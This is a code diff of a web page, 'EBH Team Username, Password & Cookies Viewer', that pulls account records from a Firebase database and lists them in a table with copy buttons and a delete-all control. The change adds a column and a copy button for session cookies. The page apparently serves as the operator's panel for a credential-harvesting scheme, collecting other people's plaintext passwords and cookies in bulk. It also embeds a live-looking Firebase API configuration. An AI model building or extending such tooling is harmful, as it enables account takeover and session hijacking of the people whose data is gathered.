@@ -3,10 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <title>EBH Team - Username & Password Viewer</title>
-<!-- Web View এর জন্য স্পষ্টভাবে viewport সেট করুন -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-
-<!-- Font Awesome for icons -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
@@ -15,7 +12,6 @@
   padding: 0;
   box-sizing: border-box;
   -webkit-tap-highlight-color: transparent;
-  -webkit-text-size-adjust: 100%;
 }
 
 :root {
@@ -26,12 +22,14 @@
   --danger: #ef4444;
   --danger-dark: #dc2626;
   --warning: #f59e0b;
+  --warning-dark: #d97706;
   --dark-bg: #0f172a;
   --card-bg: #1e293b;
   --text-light: #e5e7eb;
   --text-gray: #94a3b8;
   --border-color: #334155;
   --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+  --table-border: #475569;
 }
 
 body {
@@ -43,10 +41,8 @@ body {
   display: flex;
   flex-direction: column;
   align-items: center;
-  justify-content: flex-start;
   overflow-x: hidden;
-  font-size: 15px;
-  -webkit-overflow-scrolling: touch;
+  font-size: 14px;
 }
 
 .container {
@@ -66,7 +62,7 @@ body {
 
 .header h1 {
   color: var(--primary);
-  font-size: 1.6rem;
+  font-size: 1.5rem;
   margin-bottom: 6px;
   display: flex;
   align-items: center;
@@ -75,13 +71,9 @@ body {
   flex-wrap: wrap;
 }
 
-.header h1 i {
-  font-size: 1.5rem;
-}
-
 .header .subtitle {
   color: var(--text-gray);
-  font-size: 0.9rem;
+  font-size: 0.85rem;
   letter-spacing: 0.5px;
 }
 
@@ -112,7 +104,7 @@ body {
 }
 
 .stat .label {
-  font-size: 0.75rem;
+  font-size: 0.7rem;
   color: var(--text-gray);
   text-transform: uppercase;
   letter-spacing: 0.5px;
@@ -122,34 +114,6 @@ body {
   width: 1px;
   height: 30px;
   background: var(--border-color);
-}
-
-/* Search Result Card */
-.search-stat {
-  background: var(--card-bg);
-  border-radius: 10px;
-  padding: 12px 15px;
-  margin-bottom: 15px;
-  box-shadow: var(--shadow);
-  display: none;
-  justify-content: space-between;
-  align-items: center;
-  border-left: 4px solid var(--warning);
-  width: 100%;
-}
-
-.search-stat .number {
-  font-size: 1.4rem;
-  font-weight: bold;
-  color: var(--warning);
-  display: block;
-}
-
-.search-stat .label {
-  font-size: 0.75rem;
-  color: var(--text-gray);
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
 }
 
 /* Search Section */
@@ -175,15 +139,8 @@ body {
   border: 1px solid var(--border-color);
   background: #0f172a;
   color: var(--text-light);
-  font-size: 15px;
-  height: 46px;
-  -webkit-appearance: none;
-  appearance: none;
-}
-
-.search-container input:focus {
-  outline: none;
-  border-color: var(--secondary);
+  font-size: 14px;
+  height: 44px;
 }
 
 .search-btn {
@@ -201,14 +158,22 @@ body {
   align-items: center;
   gap: 5px;
   font-weight: bold;
-  font-size: 0.85rem;
-  height: 36px;
-  -webkit-appearance: none;
-  appearance: none;
+  font-size: 0.8rem;
+  height: 34px;
 }
 
-.search-btn:hover {
-  background: var(--secondary-dark);
+/* Search Result Card */
+.search-stat {
+  background: var(--card-bg);
+  border-radius: 10px;
+  padding: 12px 15px;
+  margin-bottom: 15px;
+  box-shadow: var(--shadow);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  border-left: 4px solid var(--secondary);
+  width: 100%;
 }
 
 /* Main Card */
@@ -219,6 +184,8 @@ body {
   margin-bottom: 15px;
   box-shadow: var(--shadow);
   width: 100%;
+  min-height: 350px;
+  transition: min-height 0.3s ease;
 }
 
 .card-header {
@@ -229,7 +196,7 @@ body {
 }
 
 .card-title {
-  font-size: 1.2rem;
+  font-size: 1.1rem;
   color: var(--primary);
   display: flex;
   align-items: center;
@@ -246,79 +213,239 @@ body {
   display: flex;
   align-items: center;
   gap: 6px;
-  font-size: 0.85rem;
-  -webkit-appearance: none;
-  appearance: none;
+  font-size: 0.8rem;
+  transition: all 0.2s;
 }
 
 .refresh-btn:hover {
-  background: var(--primary);
-  color: var(--dark-bg);
+  background: rgba(34, 197, 94, 0.1);
 }
 
-/* Textarea Container */
-.textarea-container {
-  position: relative;
-  margin-bottom: 12px;
-}
-
-.textarea-container textarea {
-  width: 100%;
-  height: 280px;
+/* Accounts Container - Google Sheet Style */
+.accounts-container {
   background: #0f172a;
-  color: var(--text-light);
   border: 1px solid var(--border-color);
   border-radius: 8px;
-  padding: 12px;
-  font-size: 14px;
-  font-family: 'Courier New', monospace;
-  resize: none;
-  line-height: 1.6;
-  white-space: pre;
+  margin-bottom: 12px;
+  max-height: 300px;
   overflow-y: auto;
   -webkit-overflow-scrolling: touch;
+  position: relative;
+  min-height: 150px;
 }
 
-.textarea-container textarea:focus {
-  outline: none;
-  border-color: var(--primary);
+/* Table Container */
+.table-container {
+  width: 100%;
+  display: table;
+  border-collapse: collapse;
+  min-height: 150px;
 }
 
-.textarea-container .count {
+/* Table Header - Fixed */
+.table-header {
+  display: table-row;
+  background: #1e293b;
+  position: sticky;
+  top: 0;
+  z-index: 10;
+}
+
+.header-cell {
+  display: table-cell;
+  padding: 10px 8px;
+  border-bottom: 2px solid var(--primary);
+  font-weight: bold;
+  color: var(--primary);
+  font-size: 0.8rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  white-space: nowrap;
+  position: sticky;
+  top: 0;
+  background: #1e293b;
+}
+
+/* Table Body - Single Line Rows */
+.account-row {
+  display: table-row;
+  border-bottom: 1px solid var(--table-border);
+  transition: background-color 0.2s;
+}
+
+.account-row:hover {
+  background: rgba(30, 41, 59, 0.7);
+}
+
+.account-row:last-child {
+  border-bottom: none;
+}
+
+/* Table Cells - Fixed Height, Single Line */
+.row-cell {
+  display: table-cell;
+  padding: 10px 8px;
+  vertical-align: middle;
+  border-right: 1px solid var(--table-border);
+  max-width: 150px;
+  height: 45px;
+  position: relative;
+  overflow: hidden;
+}
+
+.row-cell:last-child {
+  border-right: none;
+}
+
+.serial-cell {
+  width: 50px;
+  min-width: 50px;
+  max-width: 50px;
+  color: var(--text-gray);
+  font-weight: bold;
+  text-align: center;
+  font-size: 0.9rem;
+  user-select: none;
+  position: sticky;
+  left: 0;
+  background: var(--dark-bg);
+  z-index: 1;
+}
+
+.username-cell {
+  width: 180px;
+  min-width: 180px;
+  max-width: 180px;
+  color: var(--text-light);
+  font-weight: 500;
+}
+
+.password-cell {
+  width: 150px;
+  min-width: 150px;
+  max-width: 150px;
+  color: var(--primary);
+  font-weight: bold;
+  font-family: 'Courier New', monospace;
+}
+
+.cookies-cell {
+  width: 250px;
+  min-width: 250px;
+  max-width: 250px;
+  color: var(--warning);
+  font-weight: 500;
+  font-family: 'Courier New', monospace;
+  font-size: 0.85rem;
+}
+
+/* Scrollable cell content - FIXED WIDTH CONTAINERS */
+.cell-content {
   position: absolute;
-  bottom: 8px;
-  right: 10px;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  padding: 10px 8px;
+  display: flex;
+  align-items: center;
+  overflow-x: auto;
+  white-space: nowrap;
+  scrollbar-width: thin;
+  scrollbar-color: var(--text-gray) transparent;
+}
+
+.cell-content::-webkit-scrollbar {
+  height: 3px;
+}
+
+.cell-content::-webkit-scrollbar-track {
+  background: transparent;
+}
+
+.cell-content::-webkit-scrollbar-thumb {
+  background: var(--text-gray);
+  border-radius: 2px;
+  opacity: 0.5;
+}
+
+.cell-content:hover::-webkit-scrollbar-thumb {
+  background: var(--primary);
+  opacity: 1;
+}
+
+/* No Data Message */
+.no-data {
+  display: table-row;
+}
+
+.no-data td {
+  padding: 40px 20px;
+  text-align: center;
+  color: var(--text-gray);
+  font-style: italic;
+}
+
+/* Loading State */
+.loading-container {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  text-align: center;
+  z-index: 100;
   background: rgba(15, 23, 42, 0.95);
-  padding: 3px 8px;
-  border-radius: 10px;
+  padding: 20px;
+  border-radius: 8px;
+  min-width: 200px;
+}
+
+.loading-spinner {
+  font-size: 2rem;
+  color: var(--primary);
+  margin-bottom: 10px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+/* Count Display */
+.count-display {
+  text-align: right;
+  padding: 8px 12px;
   font-size: 0.75rem;
   color: var(--text-gray);
-  border: 1px solid var(--border-color);
+  background: rgba(15, 23, 42, 0.8);
+  border-top: 1px solid var(--border-color);
+  border-radius: 0 0 8px 8px;
 }
 
-/* Copy Buttons Row - Mobile Optimized */
+/* Copy Buttons - Three Equal Buttons */
 .copy-buttons-row {
   display: flex;
-  gap: 8px;
+  gap: 6px;
   margin-bottom: 15px;
   width: 100%;
 }
 
-.copy-btn-half {
+.copy-btn-third {
   flex: 1;
-  padding: 12px 8px;
-  border-radius: 8px;
+  padding: 10px 5px;
+  border-radius: 6px;
   border: none;
-  font-size: 14px;
+  font-size: 12px;
   font-weight: bold;
   cursor: pointer;
   display: flex;
   align-items: center;
   justify-content: center;
-  gap: 6px;
-  min-height: 44px;
-  -webkit-appearance: none;
-  appearance: none;
+  gap: 5px;
+  min-height: 38px;
+  text-align: center;
+  transition: all 0.2s;
 }
 
 .copy-usernames-btn {
@@ -339,16 +466,22 @@ body {
   background: var(--secondary-dark);
 }
 
-/* Web View এর জন্য বিশেষভাবে Delete Button স্টাইল করুন */
+.copy-cookies-btn {
+  background: var(--warning);
+  color: var(--dark-bg);
+}
+
+.copy-cookies-btn:hover {
+  background: var(--warning-dark);
+}
+
+/* Delete Button */
 .danger-section {
   text-align: center;
   padding-top: 10px;
   border-top: 1px dashed var(--border-color);
   width: 100%;
   margin-top: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
 }
 
 .danger-btn {
@@ -361,62 +494,14 @@ body {
   display: inline-flex;
   align-items: center;
   gap: 6px;
-  font-size: 0.85rem;
-  width: auto;
-  min-width: 180px;
-  max-width: 80%;
+  font-size: 0.8rem;
+  min-width: 160px;
   justify-content: center;
-  transition: all 0.2s ease;
-  -webkit-appearance: none;
-  appearance: none;
-  white-space: nowrap;
+  transition: all 0.2s;
 }
 
 .danger-btn:hover {
-  background: var(--danger);
-  color: white;
-  transform: scale(1.02);
-}
-
-/* Web View এর জন্য বিশেষ নিয়ম */
-@media (max-width: 768px) {
-  .danger-btn {
-    min-width: 160px;
-    max-width: 70%;
-  }
-}
-
-@media (max-width: 480px) {
-  .danger-btn {
-    min-width: 140px;
-    max-width: 60%;
-    padding: 7px 14px;
-    font-size: 0.8rem;
-  }
-}
-
-@media (max-width: 360px) {
-  .danger-btn {
-    min-width: 120px;
-    max-width: 55%;
-    padding: 6px 12px;
-    font-size: 0.75rem;
-  }
-}
-
-/* iOS Web View এর জন্য বিশেষ স্টাইল */
-@supports (-webkit-touch-callout: none) {
-  .danger-btn {
-    -webkit-touch-callout: none;
-    min-width: 150px;
-  }
-}
-
-/* Android Web View এর জন্য */
-@supports not (-webkit-touch-callout: none) {
-  .danger-btn {
-    min-width: 160px;
-  }
+  background: rgba(239, 68, 68, 0.1);
 }
 
 /* Footer */
@@ -424,13 +509,13 @@ body {
   text-align: center;
   margin-top: 15px;
   color: var(--text-gray);
-  font-size: 0.75rem;
+  font-size: 0.7rem;
   padding-top: 12px;
   border-top: 1px solid var(--border-color);
   width: 100%;
 }
 
-/* Modal Styles - Mobile */
+/* Modal */
 .modal-overlay {
   position: fixed;
   top: 0;
@@ -460,81 +545,78 @@ body {
   max-width: 400px;
   padding: 20px;
   box-shadow: var(--shadow);
-  transform: translateY(-20px);
-  transition: transform 0.3s;
+  animation: modalFadeIn 0.3s ease;
 }
 
-.modal-overlay.active .modal {
-  transform: translateY(0);
+@keyframes modalFadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(-20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
 }
 
 .modal-header {
   text-align: center;
   margin-bottom: 15px;
+  color: var(--danger);
 }
 
 .modal-header i {
-  font-size: 2.5rem;
-  color: var(--danger);
+  font-size: 2rem;
   margin-bottom: 10px;
 }
 
-.modal-header h2 {
-  color: var(--danger);
-  font-size: 1.4rem;
-  margin-bottom: 8px;
-}
-
 .modal-body {
-  text-align: center;
   margin-bottom: 20px;
-  color: var(--text-gray);
-  line-height: 1.5;
-  font-size: 0.9rem;
 }
 
 .modal-body p {
-  margin-bottom: 8px;
+  margin-bottom: 10px;
+  line-height: 1.5;
 }
 
 .warning-text {
   background: rgba(239, 68, 68, 0.1);
-  padding: 10px;
-  border-radius: 8px;
   border-left: 3px solid var(--danger);
-  margin-top: 10px;
-  text-align: left;
-  font-size: 0.8rem;
+  padding: 10px;
+  border-radius: 0 4px 4px 0;
+  margin-top: 15px;
+}
+
+.warning-text i {
+  color: var(--danger);
+  margin-right: 5px;
 }
 
 .modal-actions {
   display: flex;
-  flex-direction: column;
   gap: 10px;
-  justify-content: center;
+  justify-content: flex-end;
 }
 
 .modal-btn {
-  padding: 12px 20px;
-  border-radius: 8px;
+  padding: 10px 15px;
+  border-radius: 6px;
   border: none;
-  font-size: 0.95rem;
-  font-weight: bold;
   cursor: pointer;
-  width: 100%;
-  -webkit-appearance: none;
-  appearance: none;
+  font-weight: bold;
+  font-size: 0.8rem;
+  min-width: 120px;
+  transition: all 0.2s;
 }
 
 .modal-btn-cancel {
   background: transparent;
-  border: 1px solid var(--text-gray);
-  color: var(--text-gray);
+  border: 1px solid var(--border-color);
+  color: var(--text-light);
 }
 
 .modal-btn-cancel:hover {
-  background: var(--text-gray);
-  color: var(--dark-bg);
+  background: rgba(255, 255, 255, 0.05);
 }
 
 .modal-btn-danger {
@@ -546,28 +628,109 @@ body {
   background: var(--danger-dark);
 }
 
-/* Landscape Mode */
-@media (max-height: 500px) and (orientation: landscape) {
-  .textarea-container textarea {
-    height: 180px;
-  }
-  
+/* Responsive */
+@media (max-width: 768px) {
   .header h1 {
-    font-size: 1.4rem;
+    font-size: 1.3rem;
   }
   
-  .stats-card {
-    padding: 10px 12px;
+  .header-cell {
+    font-size: 0.75rem;
+    padding: 8px 6px;
   }
   
-  .danger-btn {
-    padding: 6px 12px;
+  .row-cell {
+    padding: 8px 6px;
+    font-size: 0.85rem;
+    height: 40px;
+  }
+  
+  .copy-btn-third {
+    font-size: 11px;
+    padding: 8px 4px;
+    min-height: 36px;
+  }
+  
+  .serial-cell {
+    width: 40px;
+    min-width: 40px;
+    max-width: 40px;
+  }
+  
+  .username-cell {
+    width: 150px;
+    min-width: 150px;
+    max-width: 150px;
+  }
+  
+  .password-cell {
+    width: 120px;
+    min-width: 120px;
+    max-width: 120px;
+  }
+  
+  .cookies-cell {
+    width: 200px;
+    min-width: 200px;
+    max-width: 200px;
+  }
+}
+
+@media (max-width: 480px) {
+  .header h1 {
+    font-size: 1.2rem;
+  }
+  
+  .header-cell {
+    font-size: 0.7rem;
+    padding: 6px 4px;
+  }
+  
+  .row-cell {
+    padding: 6px 4px;
+    font-size: 0.8rem;
+    height: 38px;
+  }
+  
+  .copy-btn-third {
+    font-size: 10px;
+    padding: 6px 3px;
+    min-height: 34px;
+  }
+  
+  .serial-cell {
+    width: 35px;
+    min-width: 35px;
+    max-width: 35px;
+  }
+  
+  .username-cell {
+    width: 130px;
     min-width: 130px;
+    max-width: 130px;
+  }
+  
+  .password-cell {
+    width: 100px;
+    min-width: 100px;
+    max-width: 100px;
+  }
+  
+  .cookies-cell {
+    width: 180px;
+    min-width: 180px;
+    max-width: 180px;
+  }
+}
+
+@media (max-width: 360px) {
+  .copy-btn-third {
+    font-size: 9px;
+    padding: 5px 2px;
   }
 }
 </style>
 
-<!-- Firebase compat -->
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
@@ -575,13 +738,11 @@ body {
 <body>
 
 <div class="container">
-  <!-- Header -->
   <div class="header">
     <h1><i class="fas fa-fire"></i> EBH TEAM WORK <i class="fas fa-users"></i></h1>
-    <div class="subtitle">Username & Password Viewer</div>
+    <div class="subtitle">Username, Password & Cookies Viewer</div>
   </div>
   
-  <!-- Stats Card -->
   <div class="stats-card">
     <div class="stat">
       <span class="number" id="totalCount">0</span>
@@ -594,7 +755,6 @@ body {
     </div>
   </div>
   
-  <!-- Search Result Card -->
   <div id="searchResultCard" class="search-stat" style="display: none;">
     <div class="stat">
       <span class="number" id="searchCount">0</span>
@@ -602,17 +762,15 @@ body {
     </div>
   </div>
   
-  <!-- Search Section -->
   <div class="search-section">
     <div class="search-container">
-      <input type="text" id="searchInput" placeholder="Search password...">
+      <input type="text" id="searchInput" placeholder="Search by username, password or cookies...">
       <button class="search-btn" onclick="searchByPassword()">
         <i class="fas fa-search"></i> SEARCH
       </button>
     </div>
   </div>
   
-  <!-- Main Card -->
   <div class="main-card">
     <div class="card-header">
       <h2 class="card-title"><i class="fas fa-user-circle"></i> Account List</h2>
@@ -621,22 +779,24 @@ body {
       </button>
     </div>
     
-    <div class="textarea-container">
-      <textarea id="output" placeholder="Loading accounts..." readonly></textarea>
-      <div class="count" id="countDisplay">0 accounts</div>
+    <div class="accounts-container" id="accountsContainer">
+      <!-- Table will be generated by JavaScript -->
     </div>
     
-    <!-- Copy Buttons Row - Mobile Optimized -->
+    <div class="count-display" id="countDisplay">0 accounts</div>
+    
     <div class="copy-buttons-row">
-      <button class="copy-btn-half copy-usernames-btn" onclick="copyUsernames()">
-        <i class="fas fa-user"></i> COPY USERNAMES
+      <button class="copy-btn-third copy-usernames-btn" onclick="copyUsernames()">
+        <i class="fas fa-user"></i> USERNAMES
       </button>
-      <button class="copy-btn-half copy-passwords-btn" onclick="copyPasswords()">
-        <i class="fas fa-key"></i> COPY PASSWORDS
+      <button class="copy-btn-third copy-passwords-btn" onclick="copyPasswords()">
+        <i class="fas fa-key"></i> PASSWORDS
+      </button>
+      <button class="copy-btn-third copy-cookies-btn" onclick="copyCookies()">
+        <i class="fas fa-cookie"></i> COOKIES
       </button>
     </div>
     
-    <!-- Updated Delete Button Section -->
     <div class="danger-section">
       <button class="danger-btn" onclick="openDeleteModal()">
         <i class="fas fa-trash-alt"></i> DELETE ALL DATA
@@ -645,11 +805,11 @@ body {
   </div>
   
   <div class="footer">
-    <p>EBH TEAM Username & Password Viewer • EBH Team Work</p>
+    <p>EBH TEAM Account Viewer • EBH Team Work</p>
   </div>
 </div>
 
-<!-- Delete Confirmation Modal -->
+<!-- Delete Modal -->
 <div class="modal-overlay" id="deleteModal">
   <div class="modal">
     <div class="modal-header">
@@ -659,11 +819,10 @@ body {
     
     <div class="modal-body">
       <p>Are you sure you want to permanently delete all data from Firebase?</p>
-      <p>This action will delete <strong id="deleteCount">0</strong> accounts from the database.</p>
+      <p>This action will delete <strong id="deleteCount">0</strong> accounts.</p>
       
       <div class="warning-text">
         <p><i class="fas fa-exclamation-circle"></i> <strong>Warning:</strong> This action cannot be undone.</p>
-        <p>Once deleted, all accounts will be permanently removed and cannot be recovered.</p>
       </div>
     </div>
     
@@ -675,34 +834,6 @@ body {
 </div>
 
 <script>
-// Web View ডিটেক্ট করার জন্য
-const isWebView = /(Android|iPhone|iPad).*Version\/[0-9].*Safari|(wv|WebView)/i.test(navigator.userAgent);
-
-// Web View এর জন্য বিশেষ স্টাইল অ্যাপ্লাই করুন
-if (isWebView) {
-  document.documentElement.style.setProperty('--button-max-width', '60%');
-  
-  // বাটন স্টাইল অ্যাডজাস্ট করুন
-  const style = document.createElement('style');
-  style.textContent = `
-    .danger-btn {
-      min-width: 140px !important;
-      max-width: 60% !important;
-      margin: 0 auto;
-    }
-    
-    @media (max-width: 480px) {
-      .danger-btn {
-        min-width: 120px !important;
-        max-width: 55% !important;
-      }
-    }
-  `;
-  document.head.appendChild(style);
-  
-  console.log('Web View detected, applying special styles');
-}
-
 const firebaseConfig = {
   apiKey: "AIzaSyDLh6Zg-K3ZZexFire0F6Wr4ciHqAs",
   authDomain: "teamwork-206ba.firebaseapp.com",
@@ -713,11 +844,10 @@ const firebaseConfig = {
   appId: "1:906293702680:web:bf8c2257e1e87964ded36d"
 };
 
-// Initialize Firebase
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-const output = document.getElementById("output");
+const accountsContainer = document.getElementById("accountsContainer");
 const totalCount = document.getElementById("totalCount");
 const searchCount = document.getElementById("searchCount");
 const searchLabel = document.getElementById("searchLabel");
@@ -727,11 +857,23 @@ const lastUpdate = document.getElementById("lastUpdate");
 const deleteModal = document.getElementById("deleteModal");
 const deleteCount = document.getElementById("deleteCount");
 const searchInput = document.getElementById("searchInput");
+const mainCard = document.querySelector('.main-card');
 
 let allAccounts = [];
 let filteredAccounts = [];
 let isSearching = false;
 let currentSearchTerm = "";
+
+function showLoading() {
+  accountsContainer.innerHTML = `
+    <div class="loading-container">
+      <div class="loading-spinner">
+        <i class="fas fa-spinner fa-spin"></i>
+      </div>
+      <p>Loading accounts from Firebase...</p>
+    </div>
+  `;
+}
 
 function updateStats() {
   const total = allAccounts.length;
@@ -750,86 +892,98 @@ function updateStats() {
   countDisplay.textContent = `${isSearching ? searchResults : total} accounts`;
   deleteCount.textContent = total;
   
-  // Update last updated time
   const now = new Date();
   const timeStr = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
   lastUpdate.textContent = `${timeStr}`;
 }
 
-function formatAccountsForDisplay(accounts) {
+function renderAccountsTable(accounts) {
   if (accounts.length === 0) {
-    return isSearching && currentSearchTerm 
-      ? `No accounts found with password containing: "${currentSearchTerm}"`
+    const noDataMessage = isSearching && currentSearchTerm 
+      ? `No accounts found containing: "${currentSearchTerm}"`
       : "No accounts found in the database.";
+    
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data">
+          <td colspan="4">
+            <i class="fas fa-database" style="font-size: 2rem; margin-bottom: 10px; opacity: 0.5;"></i>
+            <p>${noDataMessage}</p>
+          </td>
+        </div>
+      </div>
+    `;
+    return;
   }
   
-  let result = "";
-  let maxUsernameLength = 0;
+  let tableHTML = `
+    <div class="table-container">
+      <div class="table-header">
+        <div class="header-cell serial-cell">#</div>
+        <div class="header-cell username-cell">Username</div>
+        <div class="header-cell password-cell">Password</div>
+        <div class="header-cell cookies-cell">Cookies</div>
+      </div>
+  `;
   
-  // Find the maximum username length for alignment
-  accounts.forEach(account => {
-    if (account.username.length > maxUsernameLength) {
-      maxUsernameLength = account.username.length;
-    }
+  accounts.forEach((account, index) => {
+    tableHTML += `
+      <div class="account-row">
+        <div class="row-cell serial-cell">
+          <div class="cell-content">${index + 1}.</div>
+        </div>
+        <div class="row-cell username-cell">
+          <div class="cell-content" title="${account.username || 'N/A'}">${account.username || 'N/A'}</div>
+        </div>
+        <div class="row-cell password-cell">
+          <div class="cell-content" title="${account.password || 'N/A'}">${account.password || 'N/A'}</div>
+        </div>
+        <div class="row-cell cookies-cell">
+          <div class="cell-content" title="${account.cookies || 'No cookies'}">${account.cookies || 'No cookies'}</div>
+        </div>
+      </div>
+    `;
   });
   
-  // Add some padding for better alignment
-  maxUsernameLength += 2;
-  
-  // Format each account with proper alignment
-  accounts.forEach(account => {
-    const username = account.username;
-    const password = account.password;
-    const spaces = " ".repeat(maxUsernameLength - username.length);
-    result += `${username}${spaces}:  ${password}\n`;
-  });
-  
-  return result;
+  tableHTML += '</div>';
+  accountsContainer.innerHTML = tableHTML;
 }
 
 function loadData() {
-  // Show loading state
-  output.value = "Loading accounts from Firebase...";
-  output.style.color = "#22c55e";
+  showLoading();
   
-  // Clear search input
   searchInput.value = '';
   isSearching = false;
   currentSearchTerm = "";
   searchResultCard.style.display = 'none';
   
-  // Fetch data from Firebase
   db.ref("accounts/parvez").once("value")
   .then(snapshot => {
     allAccounts = [];
     snapshot.forEach(child => {
       const data = child.val();
-      if (data.username && data.password) {
-        allAccounts.push({
-          username: data.username,
-          password: data.password
-        });
-      }
+      allAccounts.push({
+        username: data.username || "",
+        password: data.password || "",
+        cookies: data.cookies || data.cookie || ""
+      });
     });
     
     filteredAccounts = [...allAccounts];
-    
-    if (allAccounts.length === 0) {
-      output.value = "No accounts found in the database.";
-      output.style.color = "#ef4444";
-    } else {
-      output.value = formatAccountsForDisplay(allAccounts);
-      output.style.color = "#e5e7eb";
-    }
-    
+    renderAccountsTable(allAccounts);
     updateStats();
-    
-    // Auto-scroll to top
-    output.scrollTop = 0;
   })
   .catch(err => {
-    output.value = "Error: " + err.message;
-    output.style.color = "#ef4444";
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data">
+          <td colspan="4" style="color: #ef4444;">
+            <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+            <p>Error: ${err.message}</p>
+          </td>
+        </div>
+      </div>
+    `;
     console.error("Firebase error:", err);
   });
 }
@@ -838,25 +992,21 @@ function searchByPassword() {
   const searchTerm = searchInput.value.trim().toLowerCase();
   
   if (!searchTerm) {
-    // If search is empty, refresh to show all
     loadData();
     return;
   }
   
   filteredAccounts = allAccounts.filter(account => 
-    account.password.toLowerCase().includes(searchTerm)
+    (account.password && account.password.toLowerCase().includes(searchTerm)) ||
+    (account.username && account.username.toLowerCase().includes(searchTerm)) ||
+    (account.cookies && account.cookies.toLowerCase().includes(searchTerm))
   );
   
   isSearching = true;
   currentSearchTerm = searchTerm;
   
-  output.value = formatAccountsForDisplay(filteredAccounts);
-  output.style.color = filteredAccounts.length === 0 ? "#ef4444" : "#e5e7eb";
-  
+  renderAccountsTable(filteredAccounts);
   updateStats();
-  
-  // Auto-scroll to top
-  output.scrollTop = 0;
 }
 
 function copyUsernames() {
@@ -871,7 +1021,6 @@ function copyUsernames() {
   
   navigator.clipboard.writeText(usernames)
     .then(() => {
-      // Visual feedback
       const copyBtn = document.querySelector('.copy-usernames-btn');
       const originalText = copyBtn.innerHTML;
       copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
@@ -900,7 +1049,6 @@ function copyPasswords() {
   
   navigator.clipboard.writeText(passwords)
     .then(() => {
-      // Visual feedback
       const copyBtn = document.querySelector('.copy-passwords-btn');
       const originalText = copyBtn.innerHTML;
       copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
@@ -917,7 +1065,34 @@ function copyPasswords() {
     });
 }
 
-// Modal Functions
+function copyCookies() {
+  const accountsToCopy = isSearching ? filteredAccounts : allAccounts;
+  
+  if (accountsToCopy.length === 0) {
+    alert("⚠️ No data to copy!");
+    return;
+  }
+  
+  const cookies = accountsToCopy.map(account => account.cookies || "No cookies").join("\n");
+  
+  navigator.clipboard.writeText(cookies)
+    .then(() => {
+      const copyBtn = document.querySelector('.copy-cookies-btn');
+      const originalText = copyBtn.innerHTML;
+      copyBtn.innerHTML = '<i class="fas fa-check"></i> COPIED!';
+      copyBtn.style.background = "#d97706";
+      
+      setTimeout(() => {
+        copyBtn.innerHTML = originalText;
+        copyBtn.style.background = "";
+      }, 1500);
+    })
+    .catch(err => {
+      console.error('Copy failed:', err);
+      alert("Failed to copy cookies.");
+    });
+}
+
 function openDeleteModal() {
   if (allAccounts.length === 0) {
     alert("⚠️ No data to delete! The database is already empty.");
@@ -935,14 +1110,17 @@ function closeDeleteModal() {
 }
 
 function deleteAllData() {
-  // Close modal first
   closeDeleteModal();
   
-  // Show deleting message
-  output.value = "Deleting all data from Firebase...";
-  output.style.color = "#ef4444";
+  accountsContainer.innerHTML = `
+    <div class="loading-container">
+      <div class="loading-spinner">
+        <i class="fas fa-spinner fa-spin"></i>
+      </div>
+      <p>Deleting all data from Firebase...</p>
+    </div>
+  `;
   
-  // Delete all data from Firebase
   db.ref("accounts/parvez").remove()
   .then(() => {
     allAccounts = [];
@@ -951,54 +1129,59 @@ function deleteAllData() {
     currentSearchTerm = "";
     searchResultCard.style.display = 'none';
     
-    output.value = "✅ All data has been deleted successfully!\nThe database is now empty.";
-    output.style.color = "#22c55e";
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data" style="color: #22c55e;">
+          <td colspan="4">
+            <i class="fas fa-check-circle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+            <p>✅ All data deleted successfully!</p>
+            <p>Database is now empty.</p>
+          </td>
+        </div>
+      </div>
+    `;
     
     updateStats();
     
-    // Show success message
     setTimeout(() => {
-      alert("✅ All data has been permanently deleted from Firebase.");
+      alert("✅ All data has been permanently deleted.");
     }, 500);
   })
   .catch(err => {
-    output.value = "❌ Error deleting data: " + err.message;
-    output.style.color = "#ef4444";
+    accountsContainer.innerHTML = `
+      <div class="table-container">
+        <div class="no-data" style="color: #ef4444;">
+          <td colspan="4">
+            <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px;"></i>
+            <p>❌ Error deleting data</p>
+          </td>
+        </div>
+      </div>
+    `;
     console.error("Delete error:", err);
-    
-    alert("❌ Failed to delete data. Please check console for details.");
   });
 }
 
-// Close modal when clicking outside
 deleteModal.addEventListener("click", function(e) {
   if (e.target === deleteModal) {
     closeDeleteModal();
   }
 });
 
-// Search on Enter key
 searchInput.addEventListener("keyup", function(e) {
   if (e.key === "Enter") {
     searchByPassword();
   }
 });
 
-// Clear search on page refresh or when typing empty
 searchInput.addEventListener("input", function() {
   if (this.value.trim() === "" && isSearching) {
     loadData();
   }
 });
 
-// Mobile touch improvements
-document.addEventListener('touchstart', function() {}, {passive: true});
-
-// Load data on page load
 document.addEventListener('DOMContentLoaded', function() {
   loadData();
-  
-  // Auto-refresh every 2 minutes
   setInterval(loadData, 120000);
 });
 </script>
